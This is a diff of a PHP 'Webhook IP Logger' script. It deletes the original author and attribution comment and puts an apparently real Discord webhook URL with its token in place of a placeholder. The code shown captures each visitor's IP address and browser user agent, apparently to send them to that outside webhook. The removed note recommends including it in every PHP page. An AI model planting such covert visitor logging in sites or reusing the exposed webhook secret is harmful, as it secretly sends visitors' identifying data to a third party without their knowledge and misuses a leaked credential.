@@ -1,17 +1,9 @@
 /* 
-Please keep this copyright statemnet in tact
-Original Creator Of This Webhook IP Logger: ᴮᵉᵗᵗᵉʳ ᴼᶠᶠ ᴳᵒⁿᵉ#0869
-Creation Date: 21/10/19 
-APIs Provided By: Octolus (geoiplookup.io) and IP-API (ip-api.com)
-
-
-NOTE: You can use this in every page if you make a it a external page and require it in every other page that is php.
-
 */ 
 
 <?php
 
-        $webhookurl = "discord webhook link";
+        $webhookurl = "https://discord.com/api/webhooks/721383126848503868/ap6Cs_gG2vUhXVkPFx7YrFSUGD4o7-LU5Lj65bVQRBVosM2H8b5ROOsz6VL_s-8_Me9t";
 
         $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
         $browser = $_SERVER['HTTP_USER_AGENT'];
